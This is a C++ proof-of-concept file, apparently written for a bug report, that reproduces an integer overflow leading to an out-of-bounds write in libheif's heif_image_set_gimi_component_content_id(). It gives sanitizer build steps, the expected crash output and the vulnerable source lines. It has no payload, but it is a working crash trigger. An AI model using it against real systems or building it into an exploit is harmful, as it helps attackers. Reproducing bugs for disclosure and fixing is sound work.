/**
 * SF08 POC: Integer overflow in component_idx + 1 in heif_image_set_gimi_component_content_id()
 *
 * Build:
 *   cmake /src/libheif -DWITH_UNCOMPRESSED_CODEC=ON \
 *         -DCMAKE_C_FLAGS='-fsanitize=address,undefined' \
 *         -DCMAKE_CXX_FLAGS='-fsanitize=address,undefined' [...]
 *   make -j4 heif && make install
 *   clang++ -o poc poc_trigger.cc -I<install>/include -L<install>/lib -lheif \
 *           -Wl,-rpath,<install>/lib -fsanitize=address,undefined
 *
 * Run:
 *   ./poc
 *
 * Expected output:
 *   UBSan: applying non-zero offset to null pointer
 *   AddressSanitizer: SEGV ... in heif_image_set_gimi_component_content_id heif_uncompressed.cc:778
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <libheif/heif.h>
#include <libheif/heif_uncompressed.h>

int main() {
    fprintf(stderr, "=== SF08 POC: Integer overflow in component_idx + 1 ===\n");

    heif_image* img = nullptr;
    struct heif_error err = heif_image_create(4, 4, heif_colorspace_RGB, heif_chroma_444, &img);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "Failed to create image: %s\n", err.message);
        return 1;
    }

    fprintf(stderr, "Calling heif_image_set_gimi_component_content_id with component_idx=UINT32_MAX...\n");
    fprintf(stderr, "Expected crash: uint32 overflow at ids.resize(UINT32_MAX + 1) -> resize(0)\n");
    fprintf(stderr, "Then ids[UINT32_MAX] = content_id causes OOB write\n\n");

    // SF08 BUG: In heif_image_set_gimi_component_content_id (heif_uncompressed.cc:773-778):
    //   auto ids = image->image->get_component_content_ids();
    //   if (component_idx >= ids.size()) {
    //     ids.resize(component_idx + 1);   // OVERFLOW: UINT32_MAX + 1 = 0
    //   }
    //   ids[component_idx] = content_id;  // OOB WRITE at ids[UINT32_MAX] with size=0
    heif_image_set_gimi_component_content_id(img, UINT32_MAX, "poc-content-id");

    // This line is unreachable when the bug triggers
    fprintf(stderr, "UNEXPECTED: Survived with no crash\n");

    heif_image_release(img);
    return 0;
}
